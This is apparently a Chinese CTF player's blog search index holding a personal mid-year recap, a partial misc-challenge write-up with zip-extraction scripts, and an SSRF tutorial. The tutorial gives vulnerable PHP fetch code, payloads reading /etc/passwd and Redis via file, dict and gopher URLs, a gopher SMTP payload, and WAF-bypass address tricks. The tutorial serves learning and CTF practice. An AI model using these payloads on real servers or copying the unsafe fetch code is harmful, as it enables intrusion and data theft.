<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2025年中总结</title>
    <url>/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="凑新手捐购的年中总结"><a class="markdownIt-Anchor" href="#凑新手捐购的年中总结"></a> 凑新手(捐购)的年中总结</h1>
<p>刚考完狗史期末考试的下午，想着这个学期也结束了<br>
感觉期末周忙了和没忙一样啊，也学不到东西。。。只是为了应付考试和那该死的保研名额(为了争这个也是被卷的不行哈哈…然后也发现和别人无意义的互怼内卷貌似也没啥意义，太累了)<br>
当然考试周不能说是没有收获，毕竟这两周还是有点曲折哈哈。<br>
先简单的回顾下上半年做了什么吧</p>
<h2 id="一月"><a class="markdownIt-Anchor" href="#一月"></a> 一月</h2>
<p>没记错的话那个时候也是期末周来着，那个时候还是很有动力去准备期末考的，现在看来发现不知道在燃什么。。<br>
之后是软件赛的初赛。<br>
<strong>爆零了</strong><br>
当了一把<code>town in go</code>，当时就在想自己怎么这么菜，虽然现在也是这么想的。那个时候貌似是刚开始从<code>misc</code>转型<code>web</code>来着，也想过自己会不会转型失败直接和ctf拜拜，但是太好了，转型还算成功，和考试相比，还是<code>ctf</code>更好玩<s>等又爆零了你就不说话了</s><br>
那个时候写了个计划，可惜到寒假结束我都没有完成它(<br>
还顺带打了个春秋杯冬季赛，狠狠吃<code>misc</code>老底</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250622155910679.png" alt="image-20250622155910679"></p>
<h2 id="二月"><a class="markdownIt-Anchor" href="#二月"></a> 二月</h2>
<p>二月印象最深的大概是，第一次参加非新生赛，<strong>VNCTF</strong><br>
也是吃<code>misc</code>老底。<s>我吗?公开赛打还没入门的方向?真的假的?</s><br>
后面就回去开学了，后面忘了。。</p>
<p>o ,还有HGAME,只做了w1好像，谜语人题目w2就没去做了说是</p>
<h2 id="三月"><a class="markdownIt-Anchor" href="#三月"></a> 三月</h2>
<p>这个时候大概是在边焦虑边准备校赛吧。好害怕自己被天赋哥干爆了。去参加老登组织的培训七七八八(前面忘了，后面忘了，只记得被c3盒了)<br>
最倒霉的是月末，手机被下水道俘获了，忍痛换一个新的，从此寝室厕所里多了一条凳子。(<code>rz</code>学校厕所配置不统一)</p>
<p>(纪念一下我死去的手机，陪了主包三年没想到折在这种地方了唉唉)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/a8ce2a9b3ae7cd283f921e82f02ac146_720.jpg" alt="a8ce2a9b3ae7cd283f921e82f02ac146_720"></p>
<h2 id="四月"><a class="markdownIt-Anchor" href="#四月"></a> 四月</h2>
<p>月初是校赛来着，虽然压力很大，但是最后顶住压力靠运气好拿了第</p>
<p>二，但是其实开赛30分钟内我都是紧张得无法解题。还是太嫩了哈哈。。感觉以后当老赛棍了会好点，还是成功进队了</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2f37f17af40646f54c57f09d6628bfe3.jpg" alt="2f37f17af40646f54c57f09d6628bfe3">后来打了杭师的<code>GHCTF</code>，我草怎么被还没进队的单杀了。?<br>
故忏悔。</p>
<h2 id="五月"><a class="markdownIt-Anchor" href="#五月"></a> 五月</h2>
<p>五一?拿来吧你，<code>miniCTF</code>来咯！(乐</p>
<p>第二次打公开赛(应该算公开赛吧)</p>
<p>反应belike:<code>misc</code>怎么那么多长的像web的，<code>web</code>这怎么都是前端，wc怎么他们都会，又被另一个同年级的<code>web</code>手拷打了。</p>
<p>最后还是靠着老登上号发力了打上去。</p>
<p>我,再忏悔。</p>
<h2 id="六月"><a class="markdownIt-Anchor" href="#六月"></a> 六月</h2>
<p>纱布期末周，期末周前还有一个<code>LitCTF</code>，学长说让我<code>ak</code>，我六缺2，剩下的一个是弱密码，一个是反序列化，菜菜菜菜菜菜<br>
抱憾去参加期末考，更抱憾了<s>吊学校考试排的什么日程吃柠檬</s></p>
<p>考了一半数据结构成绩出来发现8开头天都塌了，保你码研保，不保了(</p>
<p>再再忏悔。？忏你吗悔，没啥软用啊我看。</p>
<p>感觉要重新磨砺一下自己的集中力和意志力了。不然感觉会在水群中迷失了方向啊。。</p>
<p>想做技术型主包来着()</p>
<p>当然在考试的过程中也考虑过卷这个问题，好想卷过，但是日防夜放放到现在，发现还是卷不过。也过郁郁不得志的时候，感觉好像带学和自己想象的不一样，感觉失去乐趣了。但是最后在朋友的帮助下还是重拾了信心，大二给他们来个大的(希望如此，并非开玩笑。)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/2fedb402d4e9ac66330c6287e44b72c6_720.jpg" alt="2fedb402d4e9ac66330c6287e44b72c6_720"></p>
<p>就复盘到这里吧，明天还有课程设计来着，啥比学校花活还真是有点多啊我看。明明期末考考完了还迟迟不肯放学生走吗(虽然要集训我本身就走不了哈哈。</p>
]]></content>
      <tags>
        <tag>-总结</tag>
      </tags>
  </entry>
  <entry>
    <title>114514分钟能了解SSRF吗</title>
    <url>/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/</url>
    <content><![CDATA[<h1 id="1919810分钟能了解ssrf吗"><a class="markdownIt-Anchor" href="#1919810分钟能了解ssrf吗"></a> ♿1919810分钟能了解SSRF吗♿</h1>
<p>冲刺♿，冲刺♿，冲♿</p>
<h2 id="ssrf是扫码"><a class="markdownIt-Anchor" href="#ssrf是扫码"></a> SSRF是扫码</h2>
<p>SSRF，全称<strong>Server-Side Request Forgery，服务器端请求伪造</strong></p>
<p>关键词是<code>ip</code></p>
<p>通过用户输入包含URL的功能/请求参数包含外部资源应用来触发s</p>
<p>说白了就是通过一些方式偷偷的摸进内网视奸</p>
<p>目前有记载的主流的在PHP</p>
<p>说实话其实只要涉及对内网的文件有读取(从自身发起请求)，过滤又不充分的都会触发这个漏洞的</p>
<h2 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h2>
<pre><code class="highlight php"><span class="title function_ invoke__">file_get_contents</span>()
<span class="title function_ invoke__">fsockopen</span>()
<span class="title function_ invoke__">curl_exec</span>()
<span class="title function_ invoke__">fopen</span>()
<span class="title function_ invoke__">readfile</span>()</code></pre>
<p>先讲第一个</p>
<ul>
<li><code>file_get_contents()</code></li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;
<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);
<span class="meta">?&gt;</span></code></pre>
<p>从url这个参数里获取内容，并指定一个文件名进行保存</p>
<p>而<code>file_put_contents</code>是把字符串写入文件当中</p>
<ul>
<li><code>fsockopen()</code></li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span> 
<span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; 
    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); 
    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; 
        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; 
    &#125; <span class="keyword">else</span> &#123; 
        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; 
        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; 
        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; 
        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; 
        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); 
        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; 
        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; 
            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); 
        &#125; 
        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); 
        <span class="keyword">return</span> <span class="variable">$contents</span>; 
    &#125; 
&#125;
<span class="meta">?&gt;</span></code></pre>
<p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p>
<ul>
<li><code>curl_exec()</code></li>
</ul>
<p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span> 
<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;
    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();
    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);
    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);
    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);
    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);

    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;
    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); 
    <span class="keyword">echo</span> <span class="variable">$result</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>
<p><code>curl_exec</code>函数用于执行指定的cURL会话</p>
<ul>
<li><code>fopen()</code></li>
<li><code>readfile()</code></li>
</ul>
<blockquote>
<p>[!CAUTION]</p>
</blockquote>
<pre><code class="highlight plaintext">1.一般情况下PHP不会开启fopen的gopher wrapper
2.file_get_contents的gopher协议不能URL编码
3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败
4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用
5.curl_exec() //默认不跟踪跳转，
6.file_get_contents() // file_get_contents支持php://input协议</code></pre>
<h2 id="python"><a class="markdownIt-Anchor" href="#python"></a> Python</h2>
<p>对python的SSRF不太熟悉，故这里引用大佬的一些内容</p>
<p>在Python中，常用的函数有urllib(urllib2)和requests库。以urllib(urllib2)为例， urllib并不支持gopher,dict协议，所以按照常理来讲ssrf在python中的危害也应该不大，但是当SSRF遇到CRLF，奇妙的事情就发生了。</p>
<p>urllib曾爆出CVE-2019-9740、CVE-2019-9947两个漏洞，这两个漏洞都是urllib(urllib2)的CRLF漏洞，只是触发点不一样，其影响范围都在urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3之间，目前大部分服务器的python2版本都在2.7.10以下，python3都在3.6.x，这两个CRLF漏洞的影响力就非常可观了。其实之前还有一个CVE-2016-5699，同样的urllib（urllib2）的CRLF问题，但是由于时间比较早，影响范围没有这两个大，这里也不再赘叙</p>
<p>python2代码如下：</p>
<pre><code class="highlight plaintext">import sysimport urllib2host = &quot;127.0.0.1:7777?a=1 HTTP/1.1\r\nCRLF-injection: test\r\nTEST: 123&quot;url = &quot;http://&quot;+ host + &quot;:8080/test/?test=a&quot;try:  info = urllib2.urlopen(url).info()  print(info)except Exception as e:print(e)</code></pre>
<h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h2>
<p>一般利用需要以下协议</p>
<h3 id="file"><a class="markdownIt-Anchor" href="#file"></a> file</h3>
<p>有回显的情况下可以打，读取任意内容</p>
<h3 id="dict"><a class="markdownIt-Anchor" href="#dict"></a> dict</h3>
<p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
<pre><code class="highlight plaintext">http://test.org/ssrf.php?url=dict://127.0.0.1:6379/info  //查看reids相关配置

如果ssrf.php中加上一行屏蔽回显的代码“curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);”，那么这种方式就失效了，和gopher一样，只能利用nc监听端口，反弹传输数据了。</code></pre>
<h3 id="gopher"><a class="markdownIt-Anchor" href="#gopher"></a> gopher</h3>
<p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell.</p>
<p>gopher包构造方法</p>
<p><strong>GET包</strong></p>
<pre><code class="highlight plaintext">截取第一行和第二行(全部url编码并且+_)
GET ......
Host ......</code></pre>
<p>实例:</p>
<pre><code class="highlight plaintext">GET /testg.php?name=xxx HTTP/1.1
Host: 10.211.55.2
可以构造为
_%47%45%54%20%2f%74%65%73%74%67%2e%70%68%70%3f%6e%61%6d%65%3d%78%78%78%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%32%31%31%2e%35%35%2e%32%0d%0a

一定要手工补上换行%0d%0a</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250505140956343.png" alt="image-20250505140956343"></p>
<p><strong>POST包</strong></p>
<pre><code class="highlight plaintext">截取以下部分
POST ....
Host ....
Content-Type: application/x-www-form-urlencoded
Content-Length: i</code></pre>
<h3 id="https"><a class="markdownIt-Anchor" href="#https"></a> http/s</h3>
<p>探测内网主机存活</p>
<h3 id="本地利用"><a class="markdownIt-Anchor" href="#本地利用"></a> 本地利用:</h3>
<p>（1）使用file协议 file protocol (任意文件读取)</p>
<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=file:///etc/passwd&quot;</code></pre>
<p>（2）使用dict协议 dict protocol (获取Redis配置信息)</p>
<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=dict://127.0.0.1:6379/info&quot;</code></pre>
<p>（3）使用gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)</p>
<pre><code class="highlight plaintext">curl -vvv &quot;http://target/ssrf.php?url=gopher://127.0.0.1:6379/_*1 %0d %0a $8%0d %0aflushall %0d %0a*3 %0d %0a $3%0d</code></pre>
<h3 id="检测端口情况"><a class="markdownIt-Anchor" href="#检测端口情况"></a> 检测端口情况</h3>
<pre><code class="highlight plaintext">3306： MySQL
443：tcp
8080：TCP服务端默认端口、JBOSS、TOMCAT、Oracle XDB（XML 数据库）
6379：Redis数据库端口</code></pre>
<h2 id="验证"><a class="markdownIt-Anchor" href="#验证"></a> 验证</h2>
<p>一般URL上会出现关键字类似于</p>
<pre><code class="highlight plaintext">Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code></pre>
<h3 id="排除法"><a class="markdownIt-Anchor" href="#排除法"></a> 排除法</h3>
<p>浏览器f12查看源代码看是否是在本地进行了请求</p>
<p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=URL,URL%E5%8F%82%E6%95%B0%E8%8B%A5%E6%98%AF%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9C%B0%E5%9D%80%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p>
<h3 id="dnslog等工具进行测试"><a class="markdownIt-Anchor" href="#dnslog等工具进行测试"></a> dnslog等工具进行测试</h3>
<p>看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p>
<h3 id="分析请求的发起端"><a class="markdownIt-Anchor" href="#分析请求的发起端"></a> 分析请求的发起端</h3>
<p>抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p>
<ul>
<li>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</li>
<li>通过二级域名暴力猜解工具模糊猜测内网地址</li>
<li>通过file协议读取内网信息获取相关地址</li>
</ul>
<h3 id="留意返回信息"><a class="markdownIt-Anchor" href="#留意返回信息"></a> 留意返回信息</h3>
<p>直接返回的Banner、title、content等信息</p>
<h3 id="留意布尔型ssrf"><a class="markdownIt-Anchor" href="#留意布尔型ssrf"></a> 留意布尔型SSRF</h3>
<p>通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p>
<h2 id="waf"><a class="markdownIt-Anchor" href="#waf"></a> WAF</h2>
<h3 id="任意指向xipio"><a class="markdownIt-Anchor" href="#任意指向xipio"></a> 任意指向(<a href="http://xip.io">xip.io</a>)</h3>
<pre><code class="highlight plaintext">http://127.0.0.1.xip.io/==&gt;http://127.0.0.1/</code></pre>
<h3 id="利用-2"><a class="markdownIt-Anchor" href="#利用-2"></a> 利用[::]</h3>
<pre><code class="highlight plaintext">利用[::]绕过localhost 
http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre>
<h3 id="利用-3"><a class="markdownIt-Anchor" href="#利用-3"></a> 利用@</h3>
<pre><code class="highlight plaintext">http://example.com@127.0.0.1</code></pre>
<h3 id="利用短链接"><a class="markdownIt-Anchor" href="#利用短链接"></a> 利用短链接</h3>
<pre><code class="highlight plaintext">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1
http://sudo.cc &gt;&gt;&gt;http://127.0.0.1</code></pre>
<h3 id="修改类型"><a class="markdownIt-Anchor" href="#修改类型"></a> 修改类型</h3>
<pre><code class="highlight plaintext">修改&quot;type=file&quot;为&quot;type=url&quot;
比如：
上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</code></pre>
<h3 id="利用enclosed-alphanumerics"><a class="markdownIt-Anchor" href="#利用enclosed-alphanumerics"></a> 利用Enclosed alphanumerics</h3>
<pre><code class="highlight plaintext">利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre>
<h3 id="利用句号"><a class="markdownIt-Anchor" href="#利用句号"></a> 利用句号</h3>
<pre><code class="highlight plaintext">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</code></pre>
<h3 id="利用进制转换"><a class="markdownIt-Anchor" href="#利用进制转换"></a> 利用进制转换</h3>
<pre><code class="highlight plaintext">例如192.168.0.1
C0 A8 00 01
8 进制格式：0300.0250.0.1
16 进制格式：0xC0.0xA8.0.1
10 进制整数格式：3232235521
16 进制整数格式：0xC0A80001
还有一种特殊的省略模式，例如10.0.0.1这个 IP 可以写成10.1

127.0.0.1=&gt;7F 00 00 01
可以是十六进制，八进制等。
115.239.210.26  &gt;&gt;&gt;  16373751032
首先把这四段数字给分别转成16进制，结果：73 ef d2 1a
然后把 73efd21a 这十六进制一起转换成8进制
记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</code></pre>
<h3 id="利用协议"><a class="markdownIt-Anchor" href="#利用协议"></a> 利用协议</h3>
<pre><code class="highlight plaintext">Dict://
dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;
ssrf.php?url=dict://attacker:11111/
SFTP://
ssrf.php?url=sftp://example.com:11111/
TFTP://
ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
LDAP://
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
Gopher://
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</code></pre>
]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>2025春秋杯冬季赛</title>
    <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    <content><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p>
<p>听C3师傅说这还不算是上强度的</p>
<p>而且准备转型Web却只做出来一个签到属于是。。有点丢人了</p>
<p>还是要多练，下次努力不啃Misc老底</p>
<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1>
<h2 id="简单算术"><a class="markdownIt-Anchor" href="#简单算术"></a> 简单算术：</h2>
<p>根据提示，想想异或，直接尝试Cyberchef一把梭</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p>
<h2 id="see-anything-in-these-pics"><a class="markdownIt-Anchor" href="#see-anything-in-these-pics"></a> See anything in these pics?</h2>
<p>附件给了一个压缩包和一张阿兹特克码</p>
<p>解析得到</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p>
<p>怀疑是压缩包的密码，带入解压压缩包，解压成功，得到一张jpg</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p>
<p>看图片结合提示(图片不止两张)猜测一共有三张图，打开010查一下，发现PNG头<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p>
<p>foremost提取一下发现是全黑的，猜测是crc校验错误，打开010发现报错检验猜想，最后随波逐流直接出(也可以直接随波逐流一把梭)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-修复高宽"></p>
<h2 id="压力大写个脚本吧"><a class="markdownIt-Anchor" href="#压力大写个脚本吧"></a> 压力大，写个脚本吧</h2>
<p>先试着解压几个包，把给的密文base64解码后是FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p>
<p>然后发现后面几个包的密文都是一样的，写个脚本直接爆</p>
<pre><code class="highlight python"><span class="keyword">import</span> zipfile
<span class="keyword">import</span> re
zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span>
<span class="keyword">while</span> <span class="literal">True</span>:
    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:
        ts1 = zipfile.ZipFile(zipname)
        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>
        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)
        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]
    <span class="keyword">else</span>:
        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre>
<p>结果发现第95包密码换了。解压显示失败，那么直接获取txt的内容解码后解压压缩包。</p>
<pre><code class="highlight python"><span class="keyword">import</span> zipfile
<span class="keyword">import</span> os
<span class="keyword">import</span> base64

<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        encoded_password = f.read().strip()
    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
    <span class="keyword">return</span> decoded_password
<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):
    <span class="keyword">try</span>:
        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:
            zf.extractall(path=extract_to, pwd=password.encode())
            <span class="built_in">print</span>(<span class="string">f&quot;解压成功: <span class="subst">&#123;zip_file&#125;</span> 到 <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)
            <span class="keyword">return</span> zf.namelist()  
    <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:
        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_file&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)
        <span class="keyword">return</span> []
<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):
    current_number = start_number
    <span class="keyword">while</span> <span class="literal">True</span>:
        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>
        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>
        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):
            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)
            <span class="keyword">break</span>
        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):
            <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)
            <span class="keyword">break</span>
        password = decode_password(password_filename)
        extracted_files = extract_zip(zip_filename, password,parent_dir)
        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:
            <span class="keyword">break</span>
        next_zip_file = <span class="literal">None</span>
        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:
            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):
                next_zip_file = extracted_file
                <span class="keyword">break</span>
        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:
            <span class="keyword">break</span>
        current_number -= <span class="number">1</span>
<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    recursive_extract()</code></pre>
<p>解码后得到hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p>
<p>应该是让我们把每个压缩包的密码解码后组成hex码产生一个png图片</p>
<p>根据我们第一个密码FG…，显然不是文件头的格式，那么从0开始到99提取文件内容</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> base64


<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):
    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:
        encoded_password = f.read().strip()
    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)
    <span class="keyword">return</span> decoded_password

